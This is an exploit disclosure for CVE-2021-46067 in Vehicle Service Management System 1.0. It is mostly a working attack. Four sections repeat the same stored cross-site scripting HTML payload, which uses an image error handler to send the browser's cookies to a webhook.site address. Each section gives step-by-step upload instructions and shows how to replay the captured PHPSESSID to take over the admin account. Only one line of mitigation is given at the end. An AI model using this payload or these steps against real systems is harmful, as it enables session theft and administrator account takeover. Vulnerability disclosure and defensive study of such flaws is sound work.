# CVE-2021-46067

### Exploit Title: Vehicle Service Management System - 'Multiple' Cookie Stealing Leads to Full Account Takeover
### Exploit Author: <a href="https://www.plsanu.com">P.L.Sanu</a>
### CVE: CVE-2021-46067
### CVSS: 9.8 CRITICAL
### References: 
- https://www.plsanu.com/vehicle-service-management-system-multiple-cookie-stealing-leads-to-full-account-takeover
- https://nvd.nist.gov/vuln/detail/CVE-2021-46067
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46067

### Description:
In Vehicle Service Management System 1.0 an attacker can steal the cookies leading to Full Account Takeover.

### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Payload:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In My Account Section enter all the required details and browse the html file in Avatar.
7. Click on update button.
8. Open the avatar image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Payload:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Create New User Section enter all the required details and browse the html file in Avatar.
7. Click on Save button.
8. Open the avatar image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Payload:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Settings Section enter all the required details and browse the html file in System Logo.
7. Click on update button.
8. Open the System Logo image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
3. Generate the Webhook URL - https://webhook.site
4. Copy the Webhook unique URL and paste it in the below html code.

### Payload:
```html
<!DOCTYPE html>
<html>
<title>Cookie Stealing</title>
<body>
<img src=x onerror="location.href='https://webhook.site/0d67f7b8-bbc7-4c41-9447-1f5dd07a2954?c='+ document.cookie">
</body>
</html>
```

5. Save the above html code For Ex:Cookie Stealing.html
6. In Settings Section enter all the required details and browse the html file in Website Cover.
7. Click on update button.
8. Open the Website Cover image in new tab and check the Webhook status.
9. We got the request it contains PHPSESSID.
10. Copy the PHPSESSID value and open any another browser.
11. Visit the admin panel http://localhost/vehicle_service/admin
12. Check the cookie values and change the PHPSESSID value to copied PHPSESSID value.
13. Now access the admin panel http://localhost/vehicle_service/admin
14. Successfully loggedin to the account. Account Takeover Successful.

### Impact:
An attacker upload malicious html file it redirects to the third party website and cookies are exposed in the request. It leads to Full Account Takeover.

### Mitigation:
It is recommended to validate the file upload functionality and Perform Secondary Checks in the session.
